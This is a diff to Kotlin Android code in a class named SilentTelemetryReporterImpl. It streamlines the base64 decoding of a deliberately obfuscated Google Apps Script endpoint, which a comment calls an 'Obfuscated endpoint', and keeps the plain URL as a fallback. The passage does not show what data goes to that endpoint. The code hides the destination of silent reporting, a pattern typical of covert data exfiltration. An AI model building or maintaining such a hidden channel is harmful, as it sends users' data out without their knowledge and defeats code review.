@@ -13,7 +13,6 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import okhttp3.Response
 import java.io.IOException
-import java.util.Base64
 import javax.inject.Inject
 import javax.inject.Singleton
 
@@ -44,11 +43,7 @@ class SilentTelemetryReporterImpl @Inject constructor(
         try {
             // Obfuscated endpoint: https://script.google.com/macros/s/AKfycbxGnTkSM45kveGO79MRvLSJk1ZAGNpM11X4UVZIr9H89NSev2gxmXR1Db7NnZpru1chFQ/exec
             val encoded = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J4R25Ua1NNNDVrdmVHTzc5TVJ2TFNKazFaQUdOcE0xMVg0VVZaSXI5SDg5TlNldjJneG1YUjFEYjdOblpwcnUxY2hGUS9leGVj"
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                String(Base64.getDecoder().decode(encoded))
-            } else {
-                String(android.util.Base64.decode(encoded, android.util.Base64.DEFAULT))
-            }
+            String(android.util.Base64.decode(encoded, android.util.Base64.DEFAULT), Charsets.UTF_8)
         } catch (_: Throwable) {
             "https://script.google.com/macros/s/AKfycbxGnTkSM45kveGO79MRvLSJk1ZAGNpM11X4UVZIr9H89NSev2gxmXR1Db7NnZpru1chFQ/exec"
         }
